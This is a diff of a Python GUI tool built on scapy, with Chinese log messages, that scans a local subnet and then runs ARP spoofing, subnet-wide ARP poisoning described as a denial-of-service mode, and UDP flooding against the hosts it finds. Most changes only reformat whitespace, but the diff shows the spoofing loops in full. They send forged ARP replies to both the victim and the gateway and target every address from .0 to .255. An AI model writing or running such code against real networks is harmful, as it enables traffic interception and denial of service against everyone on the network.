@@ -8,16 +8,14 @@ from tkinter import messagebox, ttk, scrolledtext
 from scapy.all import *
 stop = 0
 DOSS = 'OFF'
-UDP = 'OFF'
+UDP='OFF'
 runarp = 'OFF'
 rundoss = 'OFF'
-runudp = 'OFF'
+runudp='OFF'
 List = []
 all_ip = []
 afterdoorip_list = []
 target_ip_list = []
-
-
 class ARPSpoofingApp:
     def __init__(self, root):
         # 获取点击的IP
@@ -81,7 +79,7 @@ class ARPSpoofingApp:
         self.scan_button = tk.Button(
             root, text="DOSS-OFF",  command=self.doss)
         self.scan_button.place(x=35, y=70)
-        # UDP
+        #UDP
         self.scan_button_UDP = tk.Button(
             root, text="DOSS-UDP-OFF",  command=self.udp)
         self.scan_button_UDP.place(x=35, y=40)
@@ -114,41 +112,38 @@ class ARPSpoofingApp:
         self.tree.bind("<ButtonRelease-1>", on_item_click)
 
     def refresh_interfaces(self):
-        global myiplist, interfaces, alllist, iface, gateway_ip, ifaceip
+        global myiplist,interfaces,alllist,iface,gateway_ip,ifaceip
         interfaces = []
-        alllist = []
+        alllist=[]
         for name, addrs in psutil.net_if_addrs().items():
             if any(addr.family == socket.AF_INET for addr in addrs):
                 interfaces.append(name)
-        alllist = {name: [addr.address for addr in addrs if addr.family == 2]
-                   for name, addrs in psutil.net_if_addrs().items()}
+        alllist={name: [addr.address for addr in addrs if addr.family == 2]  for name, addrs in psutil.net_if_addrs().items()}
         self.interface_combo['values'] = interfaces
-        iface = interfaces[1]
+        iface=interfaces[1]
         self.log('默认网口为：'+iface)
-        myip = alllist[iface]
-        gateway_ip = str(myip[:2])
-        gateway_ip = gateway_ip[2:]
-        ifaceip = gateway_ip[:-2]
-        subnet = (".".join(gateway_ip.split(".")[:-1])) + '.0/24'
-        gateway_ip = (".".join(gateway_ip.split(".")[:-1]))+'.1'
-        self.log('默认网关为：' + gateway_ip)
-
+        myip=alllist[iface]
+        gateway_ip=str(myip[:2])
+        gateway_ip=gateway_ip[2:]
+        ifaceip=gateway_ip[:-2]
+        subnet = (".".join(gateway_ip.split(".")[:-1])) +'.0/24'
+        gateway_ip=(".".join(gateway_ip.split(".")[:-1]))+'.1'
+        self.log('默认网关为：' +gateway_ip)
     def get_selected_interface(self):
-        global myiplist, interfaces, alllist, iface, gateway_ip, ifaceip
+        global myiplist,interfaces,alllist,iface,gateway_ip,ifaceip
         if self.interface_var.get() == '':
-            a = iface
+            a=iface
         else:
-            a = self.interface_var.get()
+            a=self.interface_var.get()
         self.log('当前网口为：' + a)
-        myip = alllist[a]
-        gateway_ip = str(myip[:2])
-        gateway_ip = gateway_ip[2:]
-        ifaceip = gateway_ip[:-2]
-        subnet = (".".join(gateway_ip.split(".")[:-1])) + '.0/24'
-        gateway_ip = (".".join(gateway_ip.split(".")[:-1]))+'.1'
-        self.log('默认网关为：' + gateway_ip)
+        myip=alllist[a]
+        gateway_ip=str(myip[:2])
+        gateway_ip=gateway_ip[2:]
+        ifaceip=gateway_ip[:-2]
+        subnet = (".".join(gateway_ip.split(".")[:-1])) +'.0/24'
+        gateway_ip=(".".join(gateway_ip.split(".")[:-1]))+'.1'
+        self.log('当前网关为：' +gateway_ip)
         return a
-
     def afterdoor_del(self):
         global afterdoorip_list, target_ip_list
         target_ip_list = all_ip
@@ -249,7 +244,7 @@ class ARPSpoofingApp:
         self.log('   默认发送ARP数据包间隔100毫秒')
 
     def start_spoofing(self):
-        if target_ip_list == [] and DOSS == 'OFF' and UDP == 'OFF':
+        if target_ip_list == [] and DOSS == 'OFF' and UDP=='OFF':
             self.log("错误:请点击 IP名单 中的某行或全选")
             messagebox.showerror("错误:", "请点击 IP名单 中的某行或全选")
             return
@@ -259,7 +254,7 @@ class ARPSpoofingApp:
         self.spoof_thread = threading.Thread(target=self.spoof)
         self.spoof_thread.daemon = True
         self.spoof_thread.start()
-        if DOSS == 'OFF' and UDP == 'OFF':
+        if DOSS == 'OFF' and UDP=='OFF':
             self.log(f"开始ARP攻击:被攻击IP = {target_ip_list}, 网关IP = {gateway_ip}")
 
     def stop_spoofing(self):
@@ -273,7 +268,7 @@ class ARPSpoofingApp:
         stop = 0
 
     def doss(self):
-        global DOSS, UDP
+        global DOSS,UDP
         if self.scan_button["text"] == "DOSS-ON":
             self.scan_button.config(text="DOSS-OFF")
             DOSS = "OFF"
@@ -283,29 +278,27 @@ class ARPSpoofingApp:
         if self.scan_button_UDP["text"] == "DOSS-UDP-ON":
             self.scan_button_UDP.config(text="DOSS-UDP-OFF")
             UDP = "OFF"
-
     def doss_s(self, vip):
         global rundoss
         s = 0
         for j in afterdoorip_list:
             if vip == j:
                 s = 1
-        while self.spoofing and s == 0 and runarp == 'OFF' and runudp == 'OFF':
+        while self.spoofing and s == 0 and runarp == 'OFF' and runudp=='OFF':
             rundoss = 'ON'
             sendp(Ether(dst="ff:ff:ff:ff:ff:ff") /
-                  ARP(pdst=vip, psrc=gateway_ip), verbose=0, iface=iface)
+                  ARP(pdst=vip, psrc=gateway_ip), verbose=0,iface=iface)
             sendp(Ether(dst="ff:ff:ff:ff:ff:ff") /
-                  ARP(pdst=gateway_ip, psrc=vip), verbose=0, iface=iface)
+                  ARP(pdst=gateway_ip, psrc=vip), verbose=0,iface=iface)
             time.sleep(0.3)
-
     def udp(self):
-        global UDP, DOSS
+        global UDP,DOSS
         if self.scan_button_UDP["text"] == "UDP-ON":
             self.scan_button_UDP.config(text="UDP-OFF")
-            UDP = "OFF"
+            UDP= "OFF"
         else:
             self.scan_button_UDP.config(text="DOSS-UDP-ON")
-            UDP = "ON"
+            UDP= "ON"
         if self.scan_button["text"] == "DOSS-ON":
             self.scan_button.config(text="DOSS-OFF")
             DOSS = "OFF"
@@ -351,20 +344,19 @@ class ARPSpoofingApp:
             stop = 0
         target_ip = target_ip_list[i]
         self.log(f"开始发送ARP数据包:被攻击IP = {target_ip},网关IP = {gateway_ip},线程号{i}")
-        while self.spoofing and rundoss == 'OFF' and runudp == 'OFF':
+        while self.spoofing and rundoss == 'OFF' and runudp=='OFF':
             runarp = 'ON'
             sendp(Ether(dst="ff:ff:ff:ff:ff:ff") /
-                  ARP(pdst=target_ip, psrc=gateway_ip), verbose=0, iface=iface)
+                  ARP(pdst=target_ip, psrc=gateway_ip), verbose=0,iface=iface)
             # 发送arp数据包给被攻击IP
             sendp(Ether(dst="ff:ff:ff:ff:ff:ff") /
-                  ARP(pdst=gateway_ip, psrc=target_ip), verbose=0, iface=iface)
+                  ARP(pdst=gateway_ip, psrc=target_ip), verbose=0,iface=iface)
             time.sleep(0.1)
 
     def spoof(self):
         global stop, DOSS, target_ip_list
         if DOSS == 'ON':
-            self.log(
-                f"开始ARP攻击:被攻击IP = {gateway_ip[:-1] +'0'}-{gateway_ip[:-1] +'255'}, 网关IP = {gateway_ip}")
+            self.log(f"开始ARP攻击:被攻击IP = {gateway_ip[:-1] +'0'}-{gateway_ip[:-1] +'255'}, 网关IP = {gateway_ip}")
             self.log_area2.configure(state='normal')  # 解除禁用状态
             self.log_area2.delete("1.0", tk.END)  # 执行删除操作
             self.log_area2.configure(state='disabled')  # 恢复禁用状态
@@ -384,7 +376,7 @@ class ARPSpoofingApp:
                     thread = threading.Thread(target=self.doss_s, args=(vip,))
                     thread.start()
                 time.sleep(0.01)
-        elif UDP == 'ON':
+        elif UDP=='ON':
             self.log(
                 f"开始UDP攻击:被攻击IP = {gateway_ip[:-1] +'0'}-{gateway_ip[:-1] +'255'}")
             self.log_area2.configure(state='normal')  # 解除禁用状态
@@ -403,8 +395,7 @@ class ARPSpoofingApp:
                     self.log2(vip)
                     self.log(
                         f"开始发送UDP数据包:被攻击IP = {vip},线程号{d}")
-                    thread = threading.Thread(
-                        target=self.socket_sender_udp, args=(vip,))
+                    thread = threading.Thread(target=self.socket_sender_udp, args=(vip,))
                     thread.start()
                 time.sleep(0.01)
         else:
@@ -423,17 +414,17 @@ class ARPSpoofingApp:
         for row in self.tree.get_children():
             self.tree.delete(row)
 
-        iface = self.get_selected_interface()
-        myip = alllist[iface]
+        iface=self.get_selected_interface()
+        myip=alllist[iface]
         local_ip = self.get_local_ip()
         if not local_ip:
             self.log("错误:应该没有找到IP")
             messagebox.showerror("错误:", "应该没有找到IP")
             return
-        gateway_ip = str(myip[:2])
-        gateway_ip = gateway_ip[2:]
-        subnet = (".".join(gateway_ip.split(".")[:-1])) + '.0/24'
-        gateway_ip = (".".join(gateway_ip.split(".")[:-1]))+'.1'
+        gateway_ip=str(myip[:2])
+        gateway_ip=gateway_ip[2:]
+        subnet = (".".join(gateway_ip.split(".")[:-1])) +'.0/24'
+        gateway_ip=(".".join(gateway_ip.split(".")[:-1]))+'.1'
         self.log(f"扫描的接口: {subnet}")
 
         def gatewayError():
@@ -471,8 +462,7 @@ class ARPSpoofingApp:
         maclista = []
         # 开始ARP扫描
         self.log("开始ARP扫描...")
-        ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=subnet,
-                     psrc=gateway_ip), timeout=2, verbose=False, iface=iface)
+        ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") /ARP(pdst=subnet, psrc=gateway_ip), timeout=2, verbose=False,iface=iface)
         # 打印找到的主机在treeview中
         for _, rcv in ans:
             ip = rcv[ARP].psrc
